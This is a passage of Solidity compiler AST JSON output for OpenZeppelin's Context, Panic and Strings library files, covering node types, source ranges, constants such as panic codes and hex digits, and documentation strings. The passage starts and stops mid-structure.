Context","contractDependencies":[],"contractKind":"contract","documentation":{"id":150,"nodeType":"StructuredDocumentation","src":"127:496:1","text":" @dev Provides information about the current execution context, including the\n sender of the transaction and its data. While these are generally available\n via msg.sender and msg.data, they should not be accessed in such a direct\n manner, since when dealing with meta-transactions the account sending and\n paying for execution may not be the actual sender (as far as an application\n is concerned).\n This contract is only required for intermediate, library-like contracts."},"fullyImplemented":true,"id":177,"linearizedBaseContracts":[177],"name":"Context","nameLocation":"642:7:1","nodeType":"ContractDefinition","nodes":[{"body":{"id":158,"nodeType":"Block","src":"718:34:1","statements":[{"expression":{"expression":{"id":155,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"735:3:1","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":156,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"739:6:1","memberName":"sender","nodeType":"MemberAccess","src":"735:10:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":154,"id":157,"nodeType":"Return","src":"728:17:1"}]},"id":159,"implemented":true,"kind":"function","modifiers":[],"name":"_msgSender","nameLocation":"665:10:1","nodeType":"FunctionDefinition","parameters":{"id":151,"nodeType":"ParameterList","parameters":[],"src":"675:2:1"},"returnParameters":{"id":154,"nodeType":"ParameterList","parameters":[{"constant":false,"id":153,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":159,"src":"709:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":152,"name":"address","nodeType":"ElementaryTypeName","src":"709:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"708:9:1"},"scope":177,"src":"656:96:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":167,"nodeType":"Block","src":"825:32:1","statements":[{"expression":{"expression":{"id":164,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"842:3:1","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":165,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"846:4:1","memberName":"data","nodeType":"MemberAccess","src":"842:8:1","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes calldata"}},"functionReturnParameters":163,"id":166,"nodeType":"Return","src":"835:15:1"}]},"id":168,"implemented":true,"kind":"function","modifiers":[],"name":"_msgData","nameLocation":"767:8:1","nodeType":"FunctionDefinition","parameters":{"id":160,"nodeType":"ParameterList","parameters":[],"src":"775:2:1"},"returnParameters":{"id":163,"nodeType":"ParameterList","parameters":[{"constant":false,"id":162,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":168,"src":"809:14:1","stateVariable":false,"storageLocation":"calldata","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes"},"typeName":{"id":161,"name":"bytes","nodeType":"ElementaryTypeName","src":"809:5:1","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"808:16:1"},"scope":177,"src":"758:99:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":175,"nodeType":"Block","src":"935:25:1","statements":[{"expression":{"hexValue":"30","id":173,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"952:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"functionReturnParameters":172,"id":174,"nodeType":"Return","src":"945:8:1"}]},"id":176,"implemented":true,"kind":"function","modifiers":[],"name":"_contextSuffixLength","nameLocation":"872:20:1","nodeType":"FunctionDefinition","parameters":{"id":169,"nodeType":"ParameterList","parameters":[],"src":"892:2:1"},"returnParameters":{"id":172,"nodeType":"ParameterList","parameters":[{"constant":false,"id":171,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":176,"src":"926:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":170,"name":"uint256","nodeType":"ElementaryTypeName","src":"926:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"925:9:1"},"scope":177,"src":"863:97:1","stateMutability":"view","virtual":true,"visibility":"internal"}],"scope":178,"src":"624:338:1","usedErrors":[],"usedEvents":[]}],"src":"101:862:1"},"id":1},"@openzeppelin/contracts/utils/Panic.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Panic.sol","exportedSymbols":{"Panic":[229]},"id":230,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":179,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"99:24:2"},{"abstract":false,"baseContracts":[],"canonicalName":"Panic","contractDependencies":[],"contractKind":"library","documentation":{"id":180,"nodeType":"StructuredDocumentation","src":"125:489:2","text":" @dev Helper library for emitting standardized panic codes.\n ```solidity\n contract Example {\n      using Panic for uint256;\n      // Use any of the declared internal constants\n      function foo() { Panic.GENERIC.panic(); }\n      // Alternatively\n      function foo() { Panic.panic(Panic.GENERIC); }\n }\n ```\n Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\n _Available since v5.1._"},"fullyImplemented":true,"id":229,"linearizedBaseContracts":[229],"name":"Panic","nameLocation":"665:5:2","nodeType":"ContractDefinition","nodes":[{"constant":true,"documentation":{"id":181,"nodeType":"StructuredDocumentation","src":"677:36:2","text":"@dev generic / unspecified error"},"id":184,"mutability":"constant","name":"GENERIC","nameLocation":"744:7:2","nodeType":"VariableDeclaration","scope":229,"src":"718:40:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":182,"name":"uint256","nodeType":"ElementaryTypeName","src":"718:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783030","id":183,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"754:4:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0x00"},"visibility":"internal"},{"constant":true,"documentation":{"id":185,"nodeType":"StructuredDocumentation","src":"764:37:2","text":"@dev used by the assert() builtin"},"id":188,"mutability":"constant","name":"ASSERT","nameLocation":"832:6:2","nodeType":"VariableDeclaration","scope":229,"src":"806:39:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":186,"name":"uint256","nodeType":"ElementaryTypeName","src":"806:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783031","id":187,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"841:4:2","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"0x01"},"visibility":"internal"},{"constant":true,"documentation":{"id":189,"nodeType":"StructuredDocumentation","src":"851:41:2","text":"@dev arithmetic underflow or overflow"},"id":192,"mutability":"constant","name":"UNDER_OVERFLOW","nameLocation":"923:14:2","nodeType":"VariableDeclaration","scope":229,"src":"897:47:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":190,"name":"uint256","nodeType":"ElementaryTypeName","src":"897:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783131","id":191,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"940:4:2","typeDescriptions":{"typeIdentifier":"t_rational_17_by_1","typeString":"int_const 17"},"value":"0x11"},"visibility":"internal"},{"constant":true,"documentation":{"id":193,"nodeType":"StructuredDocumentation","src":"950:35:2","text":"@dev division or modulo by zero"},"id":196,"mutability":"constant","name":"DIVISION_BY_ZERO","nameLocation":"1016:16:2","nodeType":"VariableDeclaration","scope":229,"src":"990:49:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":194,"name":"uint256","nodeType":"ElementaryTypeName","src":"990:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783132","id":195,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1035:4:2","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"0x12"},"visibility":"internal"},{"constant":true,"documentation":{"id":197,"nodeType":"StructuredDocumentation","src":"1045:30:2","text":"@dev enum conversion error"},"id":200,"mutability":"constant","name":"ENUM_CONVERSION_ERROR","nameLocation":"1106:21:2","nodeType":"VariableDeclaration","scope":229,"src":"1080:54:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":198,"name":"uint256","nodeType":"ElementaryTypeName","src":"1080:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783231","id":199,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1130:4:2","typeDescriptions":{"typeIdentifier":"t_rational_33_by_1","typeString":"int_const 33"},"value":"0x21"},"visibility":"internal"},{"constant":true,"documentation":{"id":201,"nodeType":"StructuredDocumentation","src":"1140:36:2","text":"@dev invalid encoding in storage"},"id":204,"mutability":"constant","name":"STORAGE_ENCODING_ERROR","nameLocation":"1207:22:2","nodeType":"VariableDeclaration","scope":229,"src":"1181:55:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":202,"name":"uint256","nodeType":"ElementaryTypeName","src":"1181:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783232","id":203,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1232:4:2","typeDescriptions":{"typeIdentifier":"t_rational_34_by_1","typeString":"int_const 34"},"value":"0x22"},"visibility":"internal"},{"constant":true,"documentation":{"id":205,"nodeType":"StructuredDocumentation","src":"1242:24:2","text":"@dev empty array pop"},"id":208,"mutability":"constant","name":"EMPTY_ARRAY_POP","nameLocation":"1297:15:2","nodeType":"VariableDeclaration","scope":229,"src":"1271:48:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":206,"name":"uint256","nodeType":"ElementaryTypeName","src":"1271:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783331","id":207,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1315:4:2","typeDescriptions":{"typeIdentifier":"t_rational_49_by_1","typeString":"int_const 49"},"value":"0x31"},"visibility":"internal"},{"constant":true,"documentation":{"id":209,"nodeType":"StructuredDocumentation","src":"1325:35:2","text":"@dev array out of bounds access"},"id":212,"mutability":"constant","name":"ARRAY_OUT_OF_BOUNDS","nameLocation":"1391:19:2","nodeType":"VariableDeclaration","scope":229,"src":"1365:52:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":210,"name":"uint256","nodeType":"ElementaryTypeName","src":"1365:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783332","id":211,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1413:4:2","typeDescriptions":{"typeIdentifier":"t_rational_50_by_1","typeString":"int_const 50"},"value":"0x32"},"visibility":"internal"},{"constant":true,"documentation":{"id":213,"nodeType":"StructuredDocumentation","src":"1423:65:2","text":"@dev resource error (too large allocation or too large array)"},"id":216,"mutability":"constant","name":"RESOURCE_ERROR","nameLocation":"1519:14:2","nodeType":"VariableDeclaration","scope":229,"src":"1493:47:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":214,"name":"uint256","nodeType":"ElementaryTypeName","src":"1493:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783431","id":215,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1536:4:2","typeDescriptions":{"typeIdentifier":"t_rational_65_by_1","typeString":"int_const 65"},"value":"0x41"},"visibility":"internal"},{"constant":true,"documentation":{"id":217,"nodeType":"StructuredDocumentation","src":"1546:42:2","text":"@dev calling invalid internal function"},"id":220,"mutability":"constant","name":"INVALID_INTERNAL_FUNCTION","nameLocation":"1619:25:2","nodeType":"VariableDeclaration","scope":229,"src":"1593:58:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":218,"name":"uint256","nodeType":"ElementaryTypeName","src":"1593:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30783531","id":219,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1647:4:2","typeDescriptions":{"typeIdentifier":"t_rational_81_by_1","typeString":"int_const 81"},"value":"0x51"},"visibility":"internal"},{"body":{"id":227,"nodeType":"Block","src":"1819:151:2","statements":[{"AST":{"nativeSrc":"1854:110:2","nodeType":"YulBlock","src":"1854:110:2","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1875:4:2","nodeType":"YulLiteral","src":"1875:4:2","type":"","value":"0x00"},{"kind":"number","nativeSrc":"1881:10:2","nodeType":"YulLiteral","src":"1881:10:2","type":"","value":"0x4e487b71"}],"functionName":{"name":"mstore","nativeSrc":"1868:6:2","nodeType":"YulIdentifier","src":"1868:6:2"},"nativeSrc":"1868:24:2","nodeType":"YulFunctionCall","src":"1868:24:2"},"nativeSrc":"1868:24:2","nodeType":"YulExpressionStatement","src":"1868:24:2"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1912:4:2","nodeType":"YulLiteral","src":"1912:4:2","type":"","value":"0x20"},{"name":"code","nativeSrc":"1918:4:2","nodeType":"YulIdentifier","src":"1918:4:2"}],"functionName":{"name":"mstore","nativeSrc":"1905:6:2","nodeType":"YulIdentifier","src":"1905:6:2"},"nativeSrc":"1905:18:2","nodeType":"YulFunctionCall","src":"1905:18:2"},"nativeSrc":"1905:18:2","nodeType":"YulExpressionStatement","src":"1905:18:2"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1943:4:2","nodeType":"YulLiteral","src":"1943:4:2","type":"","value":"0x1c"},{"kind":"number","nativeSrc":"1949:4:2","nodeType":"YulLiteral","src":"1949:4:2","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"1936:6:2","nodeType":"YulIdentifier","src":"1936:6:2"},"nativeSrc":"1936:18:2","nodeType":"YulFunctionCall","src":"1936:18:2"},"nativeSrc":"1936:18:2","nodeType":"YulExpressionStatement","src":"1936:18:2"}]},"evmVersion":"paris","externalReferences":[{"declaration":223,"isOffset":false,"isSlot":false,"src":"1918:4:2","valueSize":1}],"flags":["memory-safe"],"id":226,"nodeType":"InlineAssembly","src":"1829:135:2"}]},"documentation":{"id":221,"nodeType":"StructuredDocumentation","src":"1658:113:2","text":"@dev Reverts with a panic code. Recommended to use with\n the internal constants with predefined codes."},"id":228,"implemented":true,"kind":"function","modifiers":[],"name":"panic","nameLocation":"1785:5:2","nodeType":"FunctionDefinition","parameters":{"id":224,"nodeType":"ParameterList","parameters":[{"constant":false,"id":223,"mutability":"mutable","name":"code","nameLocation":"1799:4:2","nodeType":"VariableDeclaration","scope":228,"src":"1791:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":222,"name":"uint256","nodeType":"ElementaryTypeName","src":"1791:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1790:14:2"},"returnParameters":{"id":225,"nodeType":"ParameterList","parameters":[],"src":"1819:0:2"},"scope":229,"src":"1776:194:2","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":230,"src":"657:1315:2","usedErrors":[],"usedEvents":[]}],"src":"99:1874:2"},"id":2},"@openzeppelin/contracts/utils/Strings.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Strings.sol","exportedSymbols":{"Math":[3686],"SafeCast":[5451],"SignedMath":[5595],"Strings":[1631]},"id":1632,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":231,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"101:24:3"},{"absolutePath":"@openzeppelin/contracts/utils/math/Math.sol","file":"./math/Math.sol","id":233,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1632,"sourceUnit":3687,"src":"127:37:3","symbolAliases":[{"foreign":{"id":232,"name":"Math","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3686,"src":"135:4:3","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/math/SafeCast.sol","file":"./math/SafeCast.sol","id":235,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1632,"sourceUnit":5452,"src":"165:45:3","symbolAliases":[{"foreign":{"id":234,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"173:8:3","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/math/SignedMath.sol","file":"./math/SignedMath.sol","id":237,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1632,"sourceUnit":5596,"src":"211:49:3","symbolAliases":[{"foreign":{"id":236,"name":"SignedMath","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5595,"src":"219:10:3","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[],"canonicalName":"Strings","contractDependencies":[],"contractKind":"library","documentation":{"id":238,"nodeType":"StructuredDocumentation","src":"262:34:3","text":" @dev String operations."},"fullyImplemented":true,"id":1631,"linearizedBaseContracts":[1631],"name":"Strings","nameLocation":"305:7:3","nodeType":"ContractDefinition","nodes":[{"global":false,"id":240,"libraryName":{"id":239,"name":"SafeCast","nameLocations":["325:8:3"],"nodeType":"IdentifierPath","referencedDeclaration":5451,"src":"325:8:3"},"nodeType":"UsingForDirective","src":"319:21:3"},{"constant":true,"id":243,"mutability":"constant","name":"HEX_DIGITS","nameLocation":"371:10:3","nodeType":"VariableDeclaration","scope":1631,"src":"346:56:3","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes16","typeString":"bytes16"},"typeName":{"id":241,"name":"bytes16","nodeType":"ElementaryTypeName","src":"346:7:3","typeDescriptions":{"typeIdentifier":"t_bytes16","typeString":"bytes16"}},"value":{"hexValue":"30313233343536373839616263646566","id":242,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"384:18:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_cb29997ed99ead0db59ce4d12b7d3723198c827273e5796737c926d78019c39f","typeString":"literal_string \"0123456789abcdef\""},"value":"0123456789abcdef"},"visibility":"private"},{"constant":true,"id":246,"mutability":"constant","name":"ADDRESS_LENGTH","nameLocation":"431:14:3","nodeType":"VariableDeclaration","scope":1631,"src":"408:42:3","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":244,"name":"uint8","nodeType":"ElementaryTypeName","src":"408:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"value":{"hexValue":"3230","id":245,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"448:2:3","typeDescriptions":{"typeIdentifier":"t_rational_20_by_1","typeString":"int_const 20"},"value":"20"},"visibility":"private"},{"constant":true,"id":282,"mutability":"constant","name":"SPECIAL_CHARS_LOOKUP","nameLocation":"481:20:3","nodeType":"VariableDeclaration","scope":1631,"src":"456:302:3","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":247,"name":"uint256","nodeType":"ElementaryTypeName","src":"456:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"commonType":{"typeIdentifier":"t_rational_4951760157141521116776380160_by_1","typeString":"int_const 4951760157141521116776380160"},"id":281,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_rational_17179883264_by_1","typeString":"int_const 17179883264"},"id":276,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_rational_14080_by_1","typeString":"int_const 14080"},"id":271,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_rational_5888_by_1","typeString":"int_const 5888"},"id":266,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_rational_1792_by_1","typeString":"int_const 1792"},"id":261,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_rational_768_by_1","typeString":"int_const 768"},"id":256,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"},"id":250,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":248,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"513:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783038","id":249,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"518:4:3","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"0x08"},"src":"513:9:3","typeDescriptions":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"}}],"id":251,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"512:11:3","typeDescriptions":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_512_by_1","typeString":"int_const 512"},"id":254,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":252,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"552:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783039","id":253,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"557:4:3","typeDescriptions":{"typeIdentifier":"t_rational_9_by_1","typeString":"int_const 9"},"value":"0x09"},"src":"552:9:3","typeDescriptions":{"typeIdentifier":"t_rational_512_by_1","typeString":"int_const 512"}}],"id":255,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"551:11:3","typeDescriptions":{"typeIdentifier":"t_rational_512_by_1","typeString":"int_const 512"}},"src":"512:50:3","typeDescriptions":{"typeIdentifier":"t_rational_768_by_1","typeString":"int_const 768"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_1024_by_1","typeString":"int_const 1024"},"id":259,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":257,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"585:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783061","id":258,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"590:4:3","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"0x0a"},"src":"585:9:3","typeDescriptions":{"typeIdentifier":"t_rational_1024_by_1","typeString":"int_const 1024"}}],"id":260,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"584:11:3","typeDescriptions":{"typeIdentifier":"t_rational_1024_by_1","typeString":"int_const 1024"}},"src":"512:83:3","typeDescriptions":{"typeIdentifier":"t_rational_1792_by_1","typeString":"int_const 1792"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_4096_by_1","typeString":"int_const 4096"},"id":264,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":262,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"622:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783063","id":263,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"627:4:3","typeDescriptions":{"typeIdentifier":"t_rational_12_by_1","typeString":"int_const 12"},"value":"0x0c"},"src":"622:9:3","typeDescriptions":{"typeIdentifier":"t_rational_4096_by_1","typeString":"int_const 4096"}}],"id":265,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"621:11:3","typeDescriptions":{"typeIdentifier":"t_rational_4096_by_1","typeString":"int_const 4096"}},"src":"512:120:3","typeDescriptions":{"typeIdentifier":"t_rational_5888_by_1","typeString":"int_const 5888"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_8192_by_1","typeString":"int_const 8192"},"id":269,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":267,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"661:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783064","id":268,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"666:4:3","typeDescriptions":{"typeIdentifier":"t_rational_13_by_1","typeString":"int_const 13"},"value":"0x0d"},"src":"661:9:3","typeDescriptions":{"typeIdentifier":"t_rational_8192_by_1","typeString":"int_const 8192"}}],"id":270,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"660:11:3","typeDescriptions":{"typeIdentifier":"t_rational_8192_by_1","typeString":"int_const 8192"}},"src":"512:159:3","typeDescriptions":{"typeIdentifier":"t_rational_14080_by_1","typeString":"int_const 14080"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_17179869184_by_1","typeString":"int_const 17179869184"},"id":274,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":272,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"706:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783232","id":273,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"711:4:3","typeDescriptions":{"typeIdentifier":"t_rational_34_by_1","typeString":"int_const 34"},"value":"0x22"},"src":"706:9:3","typeDescriptions":{"typeIdentifier":"t_rational_17179869184_by_1","typeString":"int_const 17179869184"}}],"id":275,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"705:11:3","typeDescriptions":{"typeIdentifier":"t_rational_17179869184_by_1","typeString":"int_const 17179869184"}},"src":"512:204:3","typeDescriptions":{"typeIdentifier":"t_rational_17179883264_by_1","typeString":"int_const 17179883264"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_rational_4951760157141521099596496896_by_1","typeString":"int_const 